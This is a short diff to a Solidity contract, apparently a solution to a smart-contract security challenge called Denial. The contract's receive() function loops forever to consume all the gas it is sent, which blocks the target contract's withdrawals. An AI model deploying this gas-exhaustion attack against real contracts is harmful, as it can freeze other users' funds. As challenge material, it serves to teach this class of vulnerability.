@@ -5,7 +5,6 @@ import "./Denial.sol";
 
 contract Solution {
     Denial public target;
-    uint256 initialbalance = 0.00001 ether;
 
     constructor(address _target) {
         target = Denial(payable(_target));
@@ -13,7 +12,7 @@ contract Solution {
 
     receive() external payable {
         while (true) {
-            uint256 i = 2 * 3 * 4 * 6 * 77;
+            uint256 i = 2 * 3 * 4 * 6 * 77; // consume all the gas
         }
     }
 }
